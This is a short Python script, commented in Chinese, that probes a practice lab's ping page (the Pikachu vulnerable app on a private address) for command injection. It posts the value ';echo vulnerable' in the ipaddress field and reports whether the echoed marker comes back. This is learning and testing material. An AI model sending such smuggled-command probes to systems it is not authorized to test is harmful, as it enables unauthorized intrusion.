import requests

def check_rce_vulnerability(url):
    # 检测RCE漏洞的Payload
    data ={
        'ipaddress':';echo vulnerable',
        'submit':'ping'
    }
    header = {
        'Cookie': 'PHPSESSID=5r1bk8gn8nnipo6jnoaipg2tm3; security=impossible',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'
    }
    # 发送请求，注入Payload，并检查响应中是否包含漏洞标识
      #response = requests.get(url + payload, timeout=5)
    response = requests.post(url=url,data = data,headers =header )
    if 'vulnerable' in response.text:
        print('网站存在RCE漏洞')
    else:
        print('网站安全')

# 要检测的目标网站URL
target_url = 'http://192.168.1.192:8086/pikachu/vul/rce/rce_ping.php'

# 调用函数进行漏洞检测
check_rce_vulnerability(target_url)

